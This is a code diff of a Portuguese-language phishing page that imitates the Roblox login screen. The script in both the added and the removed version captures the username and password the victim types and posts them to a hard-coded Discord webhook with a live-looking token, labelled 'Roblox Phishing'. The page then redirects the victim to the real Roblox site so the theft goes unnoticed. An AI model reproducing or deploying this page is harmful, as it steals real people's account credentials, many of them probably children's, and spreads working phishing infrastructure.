@@ -1,69 +1,78 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Roblox</title>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box;font-family:'Helvetica Neue',Arial,sans-serif}
+  body{min-height:100vh;display:flex;align-items:center;justify-content:center;background:#1c1f22;color:#fff}
+  .card{width:100%;max-width:400px;background:#27292c;border-radius:12px;padding:36px 32px;box-shadow:0 8px 32px rgba(0,0,0,.5);border:1px solid rgba(255,255,255,.05)}
+  .logo{text-align:center;margin-bottom:24px;font-size:28px;font-weight:800;letter-spacing:1px}
+  .logo span{color:#e2231a}
+  h2{font-size:20px;font-weight:600;margin-bottom:20px;text-align:center}
+  label{display:block;font-size:13px;color:#9ea2a6;margin-bottom:6px}
+  input{width:100%;padding:12px 14px;background:#1e2022;border:1px solid #3b3f43;border-radius:8px;color:#fff;font-size:15px;margin-bottom:16px;outline:none}
+  input:focus{border-color:#00a2ff}
+  button{width:100%;padding:13px;background:#00a2ff;border:0;border-radius:8px;color:#fff;font-size:15px;font-weight:600;cursor:pointer}
+  button:disabled{background:#3b3f43;color:#8a8d90;cursor:not-allowed}
+  button:not(:disabled):hover{background:#0090e0}
+  .foot{text-align:center;font-size:12px;color:#7a7d80;margin-top:18px}
+  .err{color:#ff5c5c;font-size:13px;text-align:center;margin-top:12px;display:none}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="logo">R<span>O</span>BLOX</div>
+  <h2>Entrar</h2>
+  <form id="f">
+    <label>Nome de usuário</label>
+    <input id="u" type="text" required>
+    <label>Senha</label>
+    <input id="p" type="password" required>
+    <button id="b" type="submit" disabled>Entrar</button>
+    <div class="err" id="e">Nome de usuário ou senha incorretos.</div>
+  </form>
+  <div class="foot">Não tem conta? <a href="https://www.roblox.com" style="color:#00a2ff">Cadastre-se</a></div>
+</div>
+
 <script>
-  // URL do teu Webhook do Discord plugada aqui
-  const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1573419514446618794/OIboCPw3DbyNEFnkmfjxLYsrL_NvhL5bUEDf6hUXsAM47V6QzfmUoNoGhVyuvwcPIVOp';
-  const URL_REDIRECT = 'https://www.roblox.com/home'; 
+  
+  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1573419514446618794/OIboCPw3DbyNEFnkmfjxLYsrL_NvhL5bUEDf6hUXsAM47V6QzfmUoNoGhVyuvwcPIVOp';
+  
+  const f = document.getElementById('f');
+  const b = document.getElementById('b');
+  const e = document.getElementById('e');
+  const u = document.getElementById('u');
+  const p = document.getElementById('p');
 
-  const form = document.getElementById('form');
-  const btn  = document.getElementById('submitBtn');
-  const err  = document.getElementById('err');
-  const user = document.getElementById('username');
-  const pass = document.getElementById('password');
+  // Botão só ativa quando preencher os dois
+  function check() { b.disabled = !(u.value.trim() && p.value); }
+  u.addEventListener('input', check);
+  p.addEventListener('input', check);
 
-  function checkInputs() {
-    if (user.value.trim() !== '' && pass.value !== '') { btn.disabled = false; }
-    else { btn.disabled = true; }
-  }
-  user.addEventListener('input', checkInputs);
-  pass.addEventListener('input', checkInputs);
+  f.addEventListener('submit', async (ev) => {
+    ev.preventDefault();
+    b.disabled = true;
+    b.textContent = 'Entrando...';
+    e.style.display = 'none';
 
-  form.addEventListener('submit', async (e) => {
-    e.preventDefault();
-    if (btn.disabled) return;
-
-    err.style.display = 'none';
-    btn.disabled = true;
-    btn.textContent = 'Entrando...';
-
-    const username = user.value.trim();
-    const password = pass.value;
-
-    const payload = {
-      username: "Roblox Logger",
-      avatar_url: "https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg",
-      embeds: [{
-        title: "🎣 Nova Conta Capturada",
-        color: 3447003,
-        fields: [
-          { name: "👤 Usuário", value: `\`${username}\``, inline: true },
-          { name: "🔑 Senha", value: `\`${password}\``, inline: true },
-          { name: "📅 Data", value: new Date().toLocaleString('pt-BR'), inline: false }
-        ],
-        footer: { text: "Roblox Phishing" }
-      }]
-    };
-
+    // Manda pro Discord
     try {
-      // Envia pro Discord
-      await fetch(DISCORD_WEBHOOK_URL, {
+      await fetch(WEBHOOK_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
+        body: JSON.stringify({ content: `🎣 **Nova Captura**\n👤 User: \`${u.value}\`\n🔑 Senha: \`${p.value}\`` })
       });
-
-      // Espera 1.5 segundos pra garantir que o Discord recebeu a mensagem
-      await new Promise(resolve => setTimeout(resolve, 1500));
-
-      // Só depois redireciona a vítima
-      window.location.href = URL_REDIRECT;
-
-    } catch (error) {
-      // Se der erro na rede, finge que a senha tá errada
-      btn.disabled = false;
-      btn.textContent = 'Entrar';
-      err.textContent = 'Erro de conexão. Tente novamente.';
-      err.style.display = 'block';
-      pass.value = '';
-      checkInputs();
+    } catch (err) {
+      console.log('Erro no envio', err);
     }
+
+    // Espera 2 segundos e joga pro Roblox real
+    setTimeout(() => {
+      window.location.href = 'https://www.roblox.com/home';
+    }, 2000);
   });
 </script>
+</body>
+</html>
